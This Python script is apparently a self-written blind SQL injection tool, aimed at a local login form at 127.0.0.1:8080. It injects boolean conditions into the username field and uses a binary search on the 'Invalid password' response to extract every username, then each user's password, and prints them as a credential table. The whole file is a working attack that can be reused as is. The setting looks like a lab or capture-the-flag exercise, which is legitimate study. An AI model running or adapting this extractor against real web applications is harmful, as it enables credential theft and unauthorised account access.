import requests
import logging
import string

URL = "http://127.0.0.1:8080/"


#Make Sure we have all Chars taken account of
out = [ord(x) for x in string.printable]
out.sort()
allChars = [chr(x) for x in out][5:]
print (allChars)

#Work out printable chars
LOW = 0
HIGH = len(allChars)

class SQL_Mappper:
    """
    Like SQL map but its mine...
    """
    def __init__(self):
        self.log = logging.getLogger("MAPPER")
        self.requestCount = 0
        self.userlist = []  #Stash Our Users

        self.payload = {"username": "John",
                        "password": "Foo",
                        "Login": True}


    def offset(self, low, high): 
        """
        Work out where we need to go for the Bin Search
        """
        midpoint = int(((high-low)/2)+low) 
        #print ("Midpoint is {0} {1}".format(midpoint, allChars[midpoint]))
        return midpoint


    def makeRequestUsers(self, theStr):
        self.requestCount += 1
        if not self.userlist:
            injectionStr = "foo' OR BINARY username >= '{0}';#".format(theStr)
        elif len(self.userlist) == 1:
            injectionStr = "foo' OR BINARY username >= '{0}' AND username != '{1}';#".format(theStr, self.userlist[0])
            #Build the TailEnd (Must be a nicer way with IN or similar)
        elif len(self.userlist) > 1:
            knownNames = ["AND username != '{0}'".format(x) for x in self.userlist]
            #print(knownNames)
            knownStr = " ".join(knownNames)
            #print(knownStr)
            injectionStr = "foo' OR BINARY username >= '{0}' {1};#".format(theStr, knownStr)
        #print(injectionStr)
        #sys.exit(0)
        self.payload["username"] = injectionStr
        r = requests.post(URL, data=self.payload)
        #logging.debug(r.text[0:10])  #Show the head of the request
        return not "Invalid password" in r.text

    def makeRequestPassword(self, theStr, theUser):
        self.requestCount += 1
        injectionStr = "{0}' AND BINARY password >= '{1}';#".format(theUser, theStr)
        #print(injectionStr)
        self.payload["username"] = injectionStr
        r = requests.post(URL, data=self.payload)
        #logging.info(r.text[0:10])  #Show the head of the request
        return not "Invalid password" in r.text

    def FuzzLetter(self,prefix="", username=None):
        """Fuzz one letter
    
        We know if we need to go higher we return False
        Lower return True
        Letter is last one where we return True.
        """
        low = 0
        high = HIGH
        bestTrue = HIGH
        while True:
            midPoint = self.offset(low, high)
            letter = allChars[midPoint]
            if prefix:
                theStr = "{0}{1}".format(prefix, letter)
            else:
                theStr = letter
            logging.debug("Current {0}/{1} == {2} {3} ({4}) DIFF={5}".format(low, high, midPoint, letter, theStr, (high-low)))
            if username:
                out = self.makeRequestPassword(theStr, username)
            else:
                out = self.makeRequestUsers(theStr)
            logging.debug("Result is {0}".format(out))

            if out:
                high = midPoint
            #if midPoint < bestTrue:
            #    bestTrue = midPoint
            else:
                low = midPoint
                bestTrue = midPoint

            if (high-low) <= 1:
                break


        logging.debug("END AT {0}".format(bestTrue))
        if bestTrue == 0 or bestTrue == HIGH:
            logging.debug("End of String")
            return False
        logging.info("Best Match was {0} ({1})".format(bestTrue, allChars[bestTrue]))
        return allChars[bestTrue]


    def binSearch(self,username = None):
        outStr = ""
        while True:
            newChar = self.FuzzLetter(outStr, username=username)
            if newChar:
                outStr += newChar
        
            else:
                break
        

        
        print ("Final Match is {0}".format(outStr))
        return outStr

    def fuzzUsers(self):
        
        log = logging.getLogger("Fuzzer")
    
        while True:
            thisUser = self.binSearch()
            log.info("User Found {0}".format(thisUser))
            if thisUser == "":
                log.debug("End of List")
                logging.info("Total Requests for users {0}".format(self.requestCount))       
                return self.userlist
            self.userlist.append(thisUser)
            log.debug("--------------------------------------")
            log.debug("Next User List is {0}".format(self.userlist))
            log.debug("---------------------------------------")

    def fuzzPasswords(self):
        #Fuzz A Users 
        passwordList = []
        startCount = self.requestCount
        for user in self.userlist:
            password = self.binSearch(user)
            logging.info("Fuzz Password for %s == %s", user, password)
            passwordList.append([user,password])
            
        logging.info("Total Requests for Passwords {0}".format(self.requestCount - startCount))
        logging.info("Requests for All {0}".format(self.requestCount))
        return passwordList




if __name__ == "__main__":
    #logging.basicConfig(level=logging.DEBUG)
    logging.basicConfig(level=logging.INFO)
    logging.getLogger("urllib3").setLevel(logging.WARNING)
    import time

    t1 = time.time()
    mapper = SQL_Mappper()
    #mapper.userlist =  ['omae_wa_mou', 'Rick_Astley', 'Richie', 'John', 'Isthis', 'Hey', 'Harry', 'Evan', 'Dan', 'Cool_Guy', 'Baby', 'Adam']
    out = mapper.fuzzUsers()
    out = mapper.fuzzPasswords()
    t2 = time.time()

    print("Total Time Taken {0}".format(t2-t1))
    #print(out)
    print("{0: <15} | {1}".format("User", "Password"))
    print("-"*30)
    for item in out:
        print("{0: <15} | {1}".format(*item))
    
    print (out)

